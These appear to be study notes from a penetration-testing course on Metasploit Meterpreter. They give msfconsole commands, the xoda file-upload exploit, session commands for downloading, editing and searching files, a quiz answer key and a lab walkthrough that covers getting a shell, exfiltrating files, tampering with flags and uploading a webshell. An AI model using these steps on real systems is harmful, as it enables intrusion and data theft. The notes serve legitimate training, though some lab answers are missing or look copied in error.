
- Meta-Interpreter
- Payload operates via DLL injection 
- Executed in memory 
- Communicates over a stager socker

Setup msfconsole
```
service postgresql start
msfconsole
workspace -a meterpreter
setg RHOST <target_ip>
setg LHOST <local_ip>
```

Scan and enumerate target
```
db_nmap -sV <target_ip>

curl http://<target_ip>
```

Setup exploit
```
search xoda
use exploit/unix/webapp/xoda_file_upload
set TARGETURI / 
info
exploit
```

Check System and User information
```
sysinfo
getuid
```

Run remote command on meterpreter session
```
sessions -C sysinfo -i 1 
```

Kill specific session
```
sessions -k <session_id>
```

Name session
```
sessions -n <session_name> -i <session_id>

sessions <session_name>
```

Display contents of file in meterpreter
```
cat <file_name>     in linux
more <file_name>     in windows
```

Edit file in meterpreter
```
edit <file_name>
```

Download file to local system from meterpreter
```
download <file_or_folder_name>
```

Get hash of a file or folder
```
checksum <hash_function> /bin/bash
```

Get more information of system with meterpreter
```
getenv PATH
```

Search through file system in meterpreter
```
search 

search -d /usr/bin -f *backdoor*

search -f *.exe
```

Get shell on target host
```
shell

/bin/bash -i 
```

Migrate to process
```
migrate <process_id>
```

Execute command via meterpreter
```
execute -f <command>
```
## Quiz

Meterpreter is a staged payload?

	TRUE

Which one of the following Msfconsole commands can be used to kill a specific session?

	sessions -k

Which one of the following meterpreter commands can be used to enumerate our current user?

	getuid
## Lab

The target server as described below is running a vulnerable web server. You have to exploit the vulnerability and get a meterpreter session on the server.  Then, you have to perform the following tasks to complete the challenge!

```
remote host: 192.219.219.3 
local host: 192.219.219.2

db_namp -sV -O 192.219.219.3

80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
3306/tcp open  mysql   MySQL 5.5.47-0ubuntu0.14.04.1
```

**Tasks:**

1. Check the present working directory on remote (exploited) machine.
```
/app/files
```
   
2. List the files present in present working directory of the remote machine.
```
No entries exist in /app/files
```


3. Check the present working directory on local (attacker) machine.
```
/root
```
   
4. List the files present in present working directory of the local machine.
```
/root

```
   
5. Get the flag value present in /app/flag1 file.
```
5c50a439f040922188a22f88cecc5277
```
   
6. Change the flag value present in /app/flag1, so that no one else can get the right flag.
```
edit flag1
```

   
7. Change the present working directory to a suspiciously named directory in /app and read the flag from a hidden file present in that directory.
```
bbbb3ed27502614e27bff65faea008a0
```
   
8. Get the flag5.zip to local machine, open it using password 56784. The information given in the extracted file will give clue about the location of the another flag.
```
164ebd6889588da166a52ca0d57b9004
```
   
9. Delete the .zip file from the directory.
```
rm flag5.zip
```
   
10. Print checksum of file mentioned in the extracted file (Refer to Q8).
```
164ebd6889588da166a52ca0d57b9004
```


11. Check the PATH environment variable on the remote machine.
```
getenv $PATH
PATH      /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

   
12. There is a file with string “ckdo” in its name in one of the places included in PATH variable. Print the flag hidden in that file.
```


```


13. Change to tools directory on the local machine.
```


```


14. Upload a PHP webshell to app directory of the remote machine.

```


```

Instructions: 

- This lab is dedicated to you! No other users are on this network :)
- Once you start the lab, you will have access to a root terminal of a Kali instance
- Your Kali has an interface with IP address 192.X.Y.Z. Run "ip addr" to know the values of X and Y.
- The target server should be located at the IP address 192.X.Y.3.
- Do not attack the gateway located at IP address 192.X.Y.1
- postgresql is not running by default so Metasploit may give you an error about this when starting